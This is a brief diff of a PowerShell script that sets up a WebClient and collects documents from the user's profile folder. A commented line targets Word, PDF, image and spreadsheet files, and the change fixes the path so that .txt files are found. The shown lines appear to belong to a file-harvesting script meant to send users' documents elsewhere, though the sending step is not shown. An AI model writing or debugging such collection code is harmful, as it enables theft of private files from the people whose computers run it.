@@ -2,7 +2,7 @@
 $http = New-Object System.Net.WebClient; 
 
 #$files = Get-ChildItem $ENV:USERPROFILE -Recurse -Include *.doc,*.pdf,*.gif,*.xls
-$files = Get-ChildItem $ENV:USERPROFILE -Include *.txt
+$files = Get-ChildItem $ENV:USERPROFILE\*.* -Include *.txt
 $i=0;
 
 foreach ($f in $files){
